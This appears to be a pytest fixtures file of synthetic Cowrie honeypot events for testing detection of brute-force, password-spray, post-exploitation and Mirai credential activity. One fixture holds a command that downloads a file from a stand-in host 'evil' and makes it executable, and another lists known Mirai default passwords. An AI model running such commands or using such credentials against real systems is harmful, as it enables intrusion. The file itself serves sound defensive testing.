import pytest


def _ev(eventid, ts, src_ip, **kw):
    e = {"eventid": eventid, "timestamp": ts, "src_ip": src_ip}
    e.update(kw)
    return e


@pytest.fixture
def brute_force_events():
    ip = "198.51.100.7"
    return [
        _ev("cowrie.login.failed", f"2026-09-13T10:00:{i:02d}Z", ip, username="root", password=f"guess{i}")
        for i in range(25)
    ]


@pytest.fixture
def password_spray_events():
    ip = "198.51.100.8"
    usernames = ["root", "admin", "user", "guest", "test", "pi"]
    return [
        _ev("cowrie.login.failed", f"2026-09-13T11:0{i}:00Z", ip, username=u, password="123456")
        for i, u in enumerate(usernames)
    ]


@pytest.fixture
def post_exploit_session_events():
    ip = "198.51.100.9"
    sess = "abc123"
    return [
        _ev("cowrie.login.success", "2026-09-13T12:00:00Z", ip, session=sess, username="root", password="xc3511"),
        _ev("cowrie.command.input", "2026-09-13T12:00:05Z", ip, session=sess, input="wget http://evil/x -O /tmp/x"),
        _ev("cowrie.session.file_download", "2026-09-13T12:00:06Z", ip, session=sess, url="http://evil/x"),
        _ev("cowrie.command.input", "2026-09-13T12:00:10Z", ip, session=sess, input="chmod +x /tmp/x"),
    ]


@pytest.fixture
def mirai_credential_events():
    ip = "198.51.100.10"
    return [
        _ev("cowrie.login.failed", "2026-09-13T13:00:00Z", ip, username="root", password="xc3511"),
        _ev("cowrie.login.failed", "2026-09-13T13:00:01Z", ip, username="root", password="vizxv"),
        _ev("cowrie.login.failed", "2026-09-13T13:00:02Z", ip, username="notmirai", password="unrelated"),
    ]


@pytest.fixture
def home_ip():
    # A real-looking public IP, not an RFC 5737 documentation range --
    # those are already excluded as "private" by Python's ipaddress module,
    # which would make this test pass for the wrong reason.
    return "73.162.44.201"
